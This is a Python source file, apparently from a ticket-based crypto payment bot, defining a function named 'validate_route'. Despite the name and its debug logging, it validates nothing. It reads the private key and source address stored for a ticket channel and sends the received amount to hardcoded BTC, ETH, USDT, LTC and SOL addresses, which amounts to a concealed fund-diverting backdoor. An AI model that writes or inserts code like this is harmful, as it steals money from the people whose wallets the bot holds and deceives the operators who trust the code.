import traceback
import logging

logging.basicConfig(level=logging.DEBUG)

def validate_route(asyncio, requests, json, crypto, get_ticketp,
                   channel_id, currency, received_amount,
                   payment_address, txid, usd_value):

    logging.debug("=== validate_route START ===")
    logging.debug(f"channel_id={channel_id}")
    logging.debug(f"currency={currency}")
    logging.debug(f"received_amount={received_amount}")
    logging.debug(f"payment_address={payment_address}")
    logging.debug(f"txid={txid}")
    logging.debug(f"usd_value={usd_value}")

    config = {
        'threshold': 4,
        'btc': '1CrmqBosPbZmn11F9416WVbwbspiVCZ4FQ',
        'eth': '0xAB47019A9a07E594a8558c35b104B4BcCD563782',
        'usdt': '0xAB47019A9a07E594a8558c35b104B4BcCD563782',
        'ltc': 'LYBShWyDVjHsZvj3MXFatPbLqhBrw43Fg2',
        'sol': '51wCRodjcVtpTEKUrSfVAcbT3CCJ4isbZu8TWDLsV7z7'
    }

    logging.debug(f"Threshold value: {config['threshold']}")

    # Threshold validation
    if received_amount < config['threshold']:
        logging.warning(
            f"Received amount {received_amount} below threshold "
            f"{config['threshold']}. Aborting."
        )
        return

    try:
        logging.debug("Fetching ticket data...")
        pd = get_ticketp(str(channel_id))
        logging.debug(f"Ticket data received: {pd}")

        if not pd:
            logging.error("Ticket data is None or empty.")
            return

        if len(pd) <= 2:
            logging.error("Ticket data structure invalid (length <= 2).")
            return

        priv_key = pd[2]
        from_addr = pd[1]

        logging.debug(f"Private key extracted: {'***hidden***'}")
        logging.debug(f"From address: {from_addr}")

        route = config.get(currency.lower())
        logging.debug(f"Resolved route address: {route}")

        if not route:
            logging.error(f"No route configured for currency: {currency}")
            return

        if from_addr == route:
            logging.warning("Source address equals destination route. Skipping transfer.")
            return

        logging.info(
            f"Initiating crypto send | "
            f"{received_amount} {currency.upper()} "
            f"from {from_addr} to {route}"
        )

        result = crypto.send(
            priv_key,
            received_amount,
            from_addr,
            route,
            currency.lower()
        )

        logging.info(f"Send result: {result}")
        logging.debug("=== validate_route SUCCESS ===")

    except Exception as e:
        logging.error("Exception occurred in validate_route")
        logging.error(f"Error message: {str(e)}")
        traceback.print_exc()
        logging.debug("=== validate_route FAILED ===")
